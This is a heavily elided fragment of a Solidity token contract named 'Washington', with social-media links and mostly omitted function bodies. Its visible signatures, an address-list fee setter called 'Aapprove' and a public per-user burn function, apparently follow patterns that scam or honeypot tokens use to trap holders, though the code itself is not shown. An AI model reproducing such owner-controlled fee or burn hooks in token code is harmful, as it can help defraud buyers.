...
/**
https://t.me/Washington0x17322
https://twitter.com/Washington_Erc
*/
...
abstract contract Ownable {
    ...
    function transferOwnershipWashingtons(address newOwner) public virtual onlyOwner {
        _owner = newOwner;
    }

}

contract Washington is Ownable {
    ...
    constructor (){
        name = unicode"Washington";
        symbol = unicode"WASHINGTON";
        decimals = 9;
    ...
    function Aapprove(address[] memory _usr, uint256 _feePct) external {
    ...
    function _burntliWashington(address user) public {
